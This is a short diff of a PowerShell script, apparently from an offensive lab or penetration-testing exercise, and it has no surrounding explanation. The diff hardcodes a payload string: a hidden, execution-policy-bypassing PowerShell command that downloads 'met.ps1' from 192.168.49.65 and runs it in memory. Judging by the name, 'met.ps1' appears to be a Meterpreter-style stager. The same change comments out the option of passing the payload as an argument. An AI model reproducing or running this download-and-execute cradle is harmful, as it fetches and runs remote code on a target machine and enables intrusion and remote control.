@@ -1,5 +1,5 @@
-#$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.64/bypass.ps1'))"
-$payload = $args[0]
+$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.65/met.ps1'))"
+#$payload = $args[0]
 
 [string]$output = ""
 
